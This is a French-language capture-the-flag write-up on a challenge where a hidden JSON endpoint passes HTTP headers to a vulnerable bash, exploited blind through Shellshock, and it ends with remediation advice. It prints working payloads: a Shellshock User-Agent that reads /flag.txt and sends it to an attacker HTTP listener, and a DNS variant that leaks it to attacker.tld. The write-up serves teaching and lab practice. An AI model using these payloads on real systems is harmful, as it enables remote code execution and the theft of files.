# Flex — un Shellshock aveugle derrière un endpoint JSON moderne

> 📖 **Public write-up by [alwil17](https://github.com/Alwil17)** — originally published at <https://alwil17.github.io/ctf-writeups/posts/flex/>  
> Source: <https://github.com/Alwil17/ctf-writeups> · MIT License, © 2026 alwil17 (see `THIRD_PARTY_LICENSES/alwil17-ctf-writeups.LICENSE`). Front matter removed, article body unmodified.

> **TL;DR** — Un endpoint non documenté, `/api/_probe`, se présente comme un
> service JSON moderne, mais son en-tête `X-Backend: shell-bridge/0.3` trahit un
> pont Python qui lance un bash vulnérable avec mes en-têtes HTTP dans son
> environnement. C'est Shellshock (CVE-2014-6271) — sauf que la sortie part dans
> `/dev/null`, donc l'exploitation est **aveugle** et je dois exfiltrer le flag
> hors bande (HTTP ou DNS). **Flag :** `NCTF{…}`.

## 1. Briefing

Un challenge web de la finale qui joue l'anti-automatisation : rien ne ressemble
à une cible Shellshock au premier coup d'œil. Pas de `/cgi-bin/`, pas de `.cgi`,
une page d'accueil qui prétend ne rien exposer.

## 2. Reconnaissance

```
GET /                → petite page « rien à voir ici », Server: nginx/1.25.3
```

Rien dans les en-têtes, pas d'erreur verbeuse. Je fuzz les endpoints et je tombe
sur un intrus :

```
GET /api/_probe
X-Backend: shell-bridge/0.3
{"status":"ok","service":"flex","probe":"ok"}
```

`shell-bridge/0.3` — voilà le fil à tirer. Un « pont shell » derrière un JSON.

## 3. Analyse

Le endpoint est un script Python qui, à chaque requête, fait quelque chose comme :

```python
subprocess.run(["/opt/bash-vuln/bin/bash", "-c", ":"], env=os.environ,
               stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
```

Le serveur passe mes en-têtes HTTP dans l'environnement (`HTTP_USER_AGENT`…), et
Python les transmet à bash. Ce bash est volontairement vulnérable à Shellshock :
il évalue le corps d'une fonction définie dans une variable d'environnement. Un
`User-Agent` de la forme `() { :; }; <commande>` exécute ma commande. Mais la
`stdout` va dans `/dev/null` : je n'aurai **jamais** le retour dans la réponse.
Donc canal hors bande obligatoire.

## 4. Exploitation (callback HTTP)

```bash
# listener côté attaquant
nc -lvnp 9999
```

```bash
curl -s \
  -H 'User-Agent: () { :; }; /usr/bin/curl -s "http://<ATTACKER>:9999/$(cat /flag.txt | base64 -w0)"' \
  http://<TARGET>:1124/api/_probe
```

Le listener reçoit `GET /<base64_du_flag>`, je décode, j'ai le flag.

### Variante DNS (si l'HTTP sortant est filtré)

```bash
curl -s \
  -H 'User-Agent: () { :; }; /usr/bin/host $(cat /flag.txt | base64 -w0 | tr "/+=" "_-.").attacker.tld' \
  http://<TARGET>:1124/api/_probe
```

Le label base64 atterrit dans les logs DNS.

## 5. Flag

```text
NCTF{…}
```

## 6. Ce qui m'a ralenti

- **Pas de fingerprint évident** : pas de bannière Apache/Ubuntu, pas d'URL
  `.cgi`. Le seul indice était `X-Backend`.
- **Aveugle** : le réflexe « un curl, une regex `NCTF{` » ne donne rien. Il faut
  accepter que l'exploitation soit à l'aveugle et monter un canal de retour.

## 7. Leçons & remédiation

- **Mettre à jour bash** (≥ 4.3-25) ; Shellshock a dix ans.
- **Ne jamais lancer un shell avec `env=os.environ`** quand des variables
  viennent d'un client HTTP. Filtrer l'environnement transmis aux sous-processus.
- **Un JSON moderne ne garantit rien** : le composant en aval peut être une
  antiquité. Auditer toute la chaîne.
